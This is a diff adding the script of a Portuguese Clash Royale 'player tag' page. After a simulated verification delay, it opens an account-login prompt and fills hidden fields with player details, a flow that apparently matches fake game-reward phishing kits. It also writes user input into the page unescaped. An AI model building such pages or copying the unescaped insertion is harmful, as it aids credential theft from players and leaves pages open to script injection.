+    function openMenu() {
+        $body.addClass('menu-is-open');
+    }
+
+    function closeMenu() {
+        $body.removeClass('menu-is-open');
+    }
+
+    $('.has-submenu').on('click', function(e) {
+        e.preventDefault();
+        $(this).next('.submenu').slideToggle(300);
+        $(this).toggleClass('active');
+    });
+
+    $('.menu').on('click', function(e) {
+        e.stopPropagation(); 
+        openMenu();
+    });
+
+    $('#closeMenu, #menuOverlay').on('click', function() {
+        closeMenu();
+    });
+
+    // Mapeamento de cartas para português
+    const cardTranslations = {
+        'Knight': 'Cavaleiro', 'Archers': 'Arqueiras', 'Goblins': 'Goblins', 'Giant': 'Gigante',
+        'P.E.K.K.A': 'P.E.K.K.A', 'Minions': 'Súditos', 'Balloon': 'Balão', 'Witch': 'Bruxa',
+        'Barbarians': 'Bárbaros', 'Golem': 'Golem', 'Skeletons': 'Esqueletos', 'Valkyrie': 'Valquíria',
+        'Skeleton Army': 'Exército de Esqueletos', 'Bomber': 'Bombardeiro', 'Musketeer': 'Mosqueteira',
+        'Baby Dragon': 'Dragão Bebê', 'Prince': 'Príncipe', 'Wizard': 'Mago', 'Mini P.E.K.K.A': 'Mini P.E.K.K.A',
+        'Spear Goblins': 'Goblins com Lança', 'Giant Skeleton': 'Esqueleto Gigante', 'Hog Rider': 'Montador de Porcos',
+        'Minion Horde': 'Horda de Súditos', 'Ice Wizard': 'Mago de Gelo', 'Royal Giant': 'Gigante Real',
+        'Guards': 'Guardas', 'Princess': 'Princesa', 'Dark Prince': 'Príncipe das Trevas', 'Three Musketeers': 'Três Mosqueteiras',
+        'Lava Hound': 'Cão de Lava', 'Ice Spirit': 'Espírito de Gelo', 'Fire Spirit': 'Espírito de Fogo',
+        'Miner': 'Mineiro', 'Sparky': 'Sparky', 'Bowler': 'Arremessador de Pedras', 'Lumberjack': 'Lenhador',
+        'Battle Ram': 'Aríete de Batalha', 'Inferno Dragon': 'Dragão Infernal', 'Ice Golem': 'Golem de Gelo',
+        'Mega Minion': 'Mega Súdito', 'Dart Goblin': 'Goblin com Dardo', 'Goblin Gang': 'Gangue Goblin',
+        'Electro Wizard': 'Mago Elétrico', 'Elite Barbarians': 'Bárbaros de Elite', 'Hunter': 'Caçador',
+        'Executioner': 'Carrasco', 'Bandit': 'Bandida', 'Royal Recruits': 'Recrutas Reais', 'Night Witch': 'Bruxa Sombria',
+        'Bats': 'Morcegos', 'Royal Ghost': 'Fantasma Real', 'Ram Rider': 'Montadora de Carneiro',
+        'Zappies': 'Faiscadores', 'Rascals': 'Malcriados', 'Cannon Cart': 'Canhão sobre Rodas',
+        'Mega Knight': 'Mega Cavaleiro', 'Skeleton Barrel': 'Barril de Esqueletos', 'Flying Machine': 'Máquina Voadora',
+        'Wall Breakers': 'Quebra-Muros', 'Royal Hogs': 'Porcos Reais', 'Goblin Giant': 'Gigante Goblin',
+        'Fisherman': 'Pescador', 'Magic Archer': 'Arqueiro Mágico', 'Electro Dragon': 'Dragão Elétrico',
+        'Firecracker': 'Fogueteira', 'Mighty Miner': 'Mineiro Poderoso', 'Elixir Golem': 'Golem de Elixir',
+        'Battle Healer': 'Curandeira de Batalha', 'Skeleton King': 'Rei Esqueleto', 'Archer Queen': 'Rainha Arqueira',
+        'Golden Knight': 'Cavaleiro Dourado', 'Monk': 'Monge', 'Phoenix': 'Fênix', 'Little Prince': 'Pequeno Príncipe'
+    };
+
+    // ============================================
+    // VERIFICAÇÃO DE ID COMENTADA TEMPORARIAMENTE
+    // Descomente quando for fazer upload do projeto
+    // ============================================
+    
+    /*
+    // Função para buscar jogador via API do Clash Royale
+    function searchPlayerByTag(playerTag) {
+        return new Promise(function(resolve, reject) {
+            // Remove # se presente e formata
+            playerTag = playerTag.replace('#', '').trim().toUpperCase();
+            
+            // Validação
+            if (!playerTag || !/^[A-Z0-9]+$/.test(playerTag)) {
+                reject({ reason: 'invalidTag', message: 'Tag inválida. Use apenas letras e números.' });
+                return;
+            }
+            
+            // URL-encode a tag
+            const encodedTag = encodeURIComponent('#' + playerTag);
+            const apiUrl = `https://api.clashroyale.com/v1/players/${encodedTag}`;
+            
+            // Tenta obter chave de API do localStorage
+            let apiKey = localStorage.getItem('clashRoyaleApiKey');
+            
+            // Valida se a chave parece ser uma chave de API válida (geralmente são longas, >20 caracteres)
+            if (!apiKey || apiKey.length < 20) {
+                reject({ 
+                    reason: 'missingApiKey', 
+                    message: '⚠️ Chave de API não configurada ou inválida! A chave deve ter pelo menos 20 caracteres. Obtenha em: https://developer.clashroyale.com/'
+                });
+                return;
+            }
+            
+            console.log('Buscando jogador com tag:', playerTag);
+            console.log('URL da API:', apiUrl);
+            
+            // Usa a chave de API diretamente
+            fetch(apiUrl, {
+                method: 'GET',
+                headers: {
+                    'Authorization': 'Bearer ' + apiKey,
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                console.log('Resposta da API - Status:', response.status, response.statusText);
+                
+                if (!response.ok) {
+                    // Tenta ler a mensagem de erro da API
+                    return response.text().then(text => {
+                        let errorData;
+                        try {
+                            errorData = JSON.parse(text);
+                        } catch (e) {
+                            errorData = { message: text };
+                        }
+                        
+                        if (response.status === 404) {
+                            throw { reason: 'notFound', message: 'Jogador não encontrado. Verifique se a tag está correta.' };
+                        }
+                        if (response.status === 403) {
+                            throw { 
+                                reason: 'invalidApiKey', 
+                                message: 'Chave de API inválida ou expirada! Verifique se copiou a chave completa em: https://developer.clashroyale.com/',
+                                details: errorData
+                            };
+                        }
+                        if (response.status === 429) {
+                            throw { reason: 'rateLimit', message: 'Muitas requisições! Aguarde alguns minutos.' };
+                        }
+                        throw { 
+                            reason: 'apiError', 
+                            message: 'Erro na API: ' + response.status + ' - ' + (errorData.message || response.statusText),
+                            details: errorData
+                        };
+                    });
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Dados do jogador recebidos:', data);
+                resolve(data);
+            })
+            .catch(error => {
+                console.error('Erro ao buscar jogador:', error);
+                // Se o erro já tiver reason, passa adiante, senão cria um erro genérico
+                if (error.reason) {
+                    reject(error);
+                } else if (error.message && error.message.includes('Failed to fetch')) {
+                    reject({ 
+                        reason: 'networkError', 
+                        message: 'Erro de rede ou CORS. A API pode estar bloqueando requisições do navegador. Use o método PHP ou um proxy.' 
+                    });
+                } else {
+                    reject({ 
+                        reason: 'unknownError', 
+                        message: 'Erro desconhecido: ' + (error.message || 'Erro ao conectar com a API'),
+                        originalError: error
+                    });
+                }
+            });
+        });
+    }
+    */
+
+    $('#submitButton').on('click', function(event) {
+        playSound();
+        const playerTagInput = $('#playertag');
+        let playerTag = playerTagInput.val().trim();
+        const formMessage = $('.id-alert');
+        const submitButton = $(this);
+
+        formMessage.hide().text('').removeClass('error success');
+
+        // ============================================
+        // VERIFICAÇÃO DE ID COMENTADA - PULA DIRETO
+        // Descomente quando for fazer upload do projeto
+        // ============================================
+        
+        // Desabilita o botão
+        submitButton.prop('disabled', true).text('Verificando...');
+
+        // Simula resposta (comentado - descomente quando for usar a API)
+        /*
+        // Busca o jogador
+        searchPlayerByTag(playerTag)
+        .then(function(response) {
+            // Sucesso - processa a resposta
+            const loginElements = $('.klik');
+            if (loginElements.length > 0) {
+                loginElements.on('click', function() {
+                    open_account_login();
+                });
+            } else {
+                console.warn("Não encontrado elemento .klik para event login.");
+            }
+            $('#id-verification').hide(); 
+            $('#player-verification').show();
+            $('#tombol1').hide(); 
+            $('#tombol2').show(); 
+            $('#content1').hide(); 
+            $('#content2').show(); 
+            $('.has-submenu').click();
+            $('.nickname').html(response && response.name ? `${response.name}` : '');
+            $('.player-nickname').html(response && response.name ? `${response.name}` : '');
+
+            $('#nicksuccess').html(response && response.name ? `Hi, ${response.name}` : 'Hi, Player');
+            
+            // Atualiza Clã
+            if (response && response.clan && response.clan.name) {
+                $('.clan').html(`<img style="margin-left:5px" src="img/battle.png" alt="Clan Badge"> ${response.clan.name}`);
+                $('.clan-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">${response.clan.name}</span>`);
+            } else {
+                $('.clan').html(`<img style="margin-left:5px" src="img/battle.png" alt="Clan Badge"> Sem Clã`);
+                $('.clan-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">Sem Clã</span>`);
+            }
+
+            // Atualiza Experiência
+            if (response && typeof response.expLevel !== 'undefined') {
+                $('.exp').html(`<img style="margin-left:5px" src="img/exp.webp" alt="Experience"> ${response.expLevel}`);
+                $('.text-on-image').html(`${response.expLevel}`);
+            } else {
+                $('.exp').html(`<img style="margin-left:5px" src="img/exp.webp" alt="Experience"> N/A`);
+                $('.text-on-image').html(`N/A`);
+            }
+
+            // Atualiza Arena
+            if (response && response.arena && response.arena.name) {
+                $('.th').html(`<img style="margin-left:5px" src="img/tournament.png" alt="Arena ${response.arena.name}"> ${response.arena.name}`);
+            } else {
+                $('.th').html(`<img style="margin-left:5px" src="img/tournament.png"> N/A`);
+            }
+
+            // Atualiza Troféus
+            if (response && typeof response.trophies !== 'undefined') {
+                $('.trophy').html(`<img style="margin-left:5px" src="img/trophy.webp" alt="Trophies"> ${response.trophies}`);
+                $('.trophy-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">${response.trophies}</span>`);
+            } else {
+                $('.trophy').html(`<img style="margin-left:5px" src="img/trophy.webp" alt="Trophies"> N/A`);
+                $('.trophy-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">N/A</span>`);
+            }
+
+            // Atualiza Carta Favorita
+            if (response && response.currentFavouriteCard && response.currentFavouriteCard.name) {
+                const cardName = response.currentFavouriteCard.name;
+                const translatedCard = cardTranslations[cardName] || cardName;
+                $('.favorite-card-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">${translatedCard}</span>`);
+            } else {
+                $('.favorite-card-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">N/A</span>`);
+            }
+
+            let townhallText = response && response.arena.name ? `${response.arena.name}` : 'N/A';
+            let expText = response && typeof response.expLevel !== 'undefined' ? `Exp Level ${response.expLevel}` : 'N/A';
+            let apiPlayerTag = response && response.tag ? response.tag : `#${playerTag.toUpperCase()}`;
+            let apiPlayerName = response && response.name ? response.name : '';
+            let apiClanName = response && response.clan && response.clan.name ? response.clan.name : 'No Clan';
+
+            $('#isitownhall').val(townhallText);
+            $('#isiexp').val(expText);
+            $('#isiplayertag').val(apiPlayerTag);
+            $('#isiplayername').val(apiPlayerName);
+            $('#isiclan').val(apiClanName);
+            
+            submitButton.prop('disabled', false).text('Buscar');
+        })
+        .catch(function(error) {
+            // Tratamento de erro
+            const errorIcon = '<i style="color:red" class="fa fa-info-circle"></i>';
+            let errorText = 'Tag Inválida ou Erro no Servidor, Tente novamente';
+
+            console.error('Erro ao buscar jogador:', error);
+
+            if (error && error.reason) {
+                if (error.reason === 'notFound') {
+                    errorText = 'Tag Inválida, Tente novamente';
+                } else if (error.reason === 'invalidApiKey') {
+                    errorText = error.message || '⚠️ Chave de API inválida! Obtenha uma nova em: https://developer.clashroyale.com/';
+                } else if (error.reason === 'missingApiKey') {
+                    errorText = error.message || '⚠️ Chave de API não configurada! A chave deve ter pelo menos 20 caracteres.';
+                } else if (error.reason === 'rateLimit') {
+                    errorText = error.message || '⚠️ Muitas requisições! Aguarde alguns minutos.';
+                } else if (error.reason === 'networkError') {
+                    errorText = error.message || '⚠️ Erro de rede. A API pode estar bloqueando requisições do navegador.';
+                } else if (error.reason === 'proxyError' || error.reason === 'apiError') {
+                    errorText = error.message || '⚠️ Erro na API. Verifique sua chave de API.';
+                } else if (error.reason === 'invalidTag') {
+                    errorText = error.message || 'Tag inválida. Use apenas letras e números.';
+                } else {
+                    errorText = error.message || errorText;
+                }
+            } else if (error && error.message) {
+                errorText = error.message;
+            }
+            
+            // Log detalhado no console para debug
+            console.error('Erro completo:', error);
+
+            formMessage.html(errorIcon + ' ' + errorText).addClass('error').show();
+            submitButton.prop('disabled', false).text('Buscar');
+        });
+        */
+        
+        // ============================================
+        // CÓDIGO TEMPORÁRIO - PULA VERIFICAÇÃO
+        // Remove este bloco quando descomentar a API acima
+        // ============================================
+        
+        // Simula um pequeno delay e avança direto
+        setTimeout(function() {
+            // Pega o valor digitado e usa como nome
+            let playerTagFormatted = playerTag.replace('#', '').trim().toUpperCase();
+            let playerTagFinal = playerTagFormatted ? '#' + playerTagFormatted : '#TAG123';
+            
+            // Avança para a próxima etapa sem verificação
+            const loginElements = $('.klik');
+            if (loginElements.length > 0) {
+                loginElements.on('click', function() {
+                    open_account_login();
+                });
+            }
+            
+            $('#id-verification').hide(); 
+            $('#player-verification').show();
+            $('#tombol1').hide(); 
+            $('#tombol2').show(); 
+            $('#content1').hide(); 
+            $('#content2').show(); 
+            $('.has-submenu').click();
+            
+            // Usa valores padrão ou do input
+            let defaultName = playerTagFormatted || 'Player';
+            $('.nickname').html(defaultName);
+            $('.player-nickname').html(defaultName);
+            $('#nicksuccess').html('Hi, ' + defaultName);
+            
+            // Valores padrão
+            $('.clan').html(`<img style="margin-left:5px" src="img/battle.png" alt="Clan Badge"> Sem Clã`);
+            $('.clan-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">Sem Clã</span>`);
+            $('.exp').html(`<img style="margin-left:5px" src="img/exp.webp" alt="Experience"> N/A`);
+            $('.text-on-image').html(`N/A`);
+            $('.th').html(`<img style="margin-left:5px" src="img/tournament.png"> N/A`);
+            $('.trophy').html(`<img style="margin-left:5px" src="img/trophy.webp" alt="Trophies"> N/A`);
+            $('.trophy-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">N/A</span>`);
+            $('.favorite-card-display').html(`<span style="color:white;text-shadow:0.5px 0.5px 1px rgba(0,0,0,0.3)">N/A</span>`);
+            
+            $('#isitownhall').val('N/A');
+            $('#isiexp').val('N/A');
+            $('#isiplayertag').val(playerTagFinal);
+            $('#isiplayername').val(defaultName);
+            $('#isiclan').val('No Clan');
+            
+            submitButton.prop('disabled', false).text('Buscar');
+        }, 500); // Pequeno delay para simular verificação
+    });
+
+});
+
+</script>
+
+</div></body></html>
